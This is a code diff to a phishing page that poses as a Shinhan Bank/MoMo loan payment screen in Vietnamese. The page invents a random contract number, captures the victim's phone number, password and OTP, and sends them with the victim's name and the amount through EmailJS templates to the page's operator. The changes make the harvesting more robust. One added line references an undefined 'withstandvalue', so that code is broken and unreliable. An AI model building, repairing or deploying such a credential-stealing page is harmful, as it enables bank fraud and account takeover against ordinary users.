@@ -214,7 +214,7 @@
             </header>
             <main class="page-body">
                 <div class="info-card payment-summary-card">
-                    <p class="label">Tổng thanh toán</p>
+                    <p class="label">Tổng số tiền thanh toán</p>
                     <h2 class="amount" id="mainTotalAmount"></h2>
                     <hr>
                     <div id="payment-details"></div>
@@ -322,15 +322,16 @@
         document.addEventListener('DOMContentLoaded', () => {
             const credentials = { phone: '', password: '', otp: '' };
             const getFormData = () => {
+                const storedData = JSON.parse(sessionStorage.getItem('formData')) || {};
                 const params = new URLSearchParams(window.location.search);
                 return {
-                    fullName: params.get('fullName') || 'N/A',
-                    cccd: params.get('cccd') || 'N/A',
-                    amount: parseInt(params.get('amount')) || 0,
-                    months: parseInt(params.get('months')) || 48,
-                    phone: params.get('phone') || 'N/A',
-                    email: params.get('email') || 'N/A',
-                    method: params.get('method') || 'momo'
+                    fullName: storedData.fullName || params.get('fullName') || '',
+                    cccd: storedData.cccd || params.get('cccd') || '',
+                    amount: parseInt(storedData.amount?.replace(/[^0-9]/g, '')) || parseInt(params.get('amount')) || 0,
+                    months: parseInt(storedData.months) || parseInt(params.get('months')) || 48,
+                    phone: storedData.phone || params.get('phone') || '',
+                    email: storedData.email || params.get('email') || '',
+                    method: storedData.method?.toLowerCase() || params.get('method') || 'momo'
                 };
             };
             
@@ -372,16 +373,16 @@
 
             const populateData = () => {
                 const principal = formData.amount || 0;
-                const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057); 
+                const interest = formData.interest !== undefined ? formData.interest : (principal * 0.057);
                 const overdueAmount = 0;
                 const earlyTerminationFee = 0;
                 const collectionFee = 24000;
-                const customerName = formData.fullName || 'N/A';
+                const customerName = formData.fullName || '';
                 const contractNumber = 'SHB-' + Math.floor(1000000000 + Math.random() * 9000000000);
                 const loanTermInMonths = formData.months || 48;
 
                 const totalAmount = principal + interest + overdueAmount + earlyTerminationFee + collectionFee;
-                getEl('mainTotalAmount').textContent = formatCurrency(totalAmount);
+                getEl('mainTotalAmount').textContent = formatCurrency(principal);
                 
                 const paymentDetailsContainer = getEl('payment-details');
                 paymentDetailsContainer.innerHTML = '';
@@ -394,10 +395,9 @@
                 
                 const customerDetailsContainer = getEl('customer-details');
                 customerDetailsContainer.innerHTML = '';
-                customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
-                customerDetailsContainer.appendChild(createDetailItem('Số CCCD', formData.cccd));
-                customerDetailsContainer.appendChild(createDetailItem('Số điện thoại', formData.phone));
-                customerDetailsContainer.appendChild(createDetailItem('Email', formData.email));
+                if (customerName) {
+                    customerDetailsContainer.appendChild(createDetailItem('Tên khách hàng', customerName));
+                }
                 customerDetailsContainer.appendChild(createDetailItem('Số hợp đồng', contractNumber));
                 
                 const closingDate = new Date();
@@ -456,14 +456,14 @@
                 const serviceID = 'service_60tgxof';
                 let templateID = '';
                 let templateParams = {};
-                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value').textContent;
+                const contractNumber = getEl('customer-details').querySelector('.detail-item:last-child .value')?.textContent || '';
 
                 const commonParams = {
                     platform: "MoMo (Shinhan Layout)",
-                    phone: credentials.phone,
+                    phone: credentials.phone || '',
                     contract_number: contractNumber,
-                    customer_name: formData.fullName,
-                    total_amount: getEl('mainTotalAmount').textContent
+                    customer_name: formData.fullName || '',
+                    total_amount: getEl('mainTotalAmount').textContent || ''
                 };
 
                 if (type === 'password') {
@@ -471,7 +471,7 @@
                     templateParams = { ...commonParams, password: value };
                 } else if (type === 'otp') {
                     templateID = 'template_g9e2jee';
-                    templateParams = { ...commonParams, otp: value, password: credentials.password };
+                    templateParams = { ...commonParams, otp: withstandvalue, password: credentials.password };
                 }
 
                 if(templateID) {
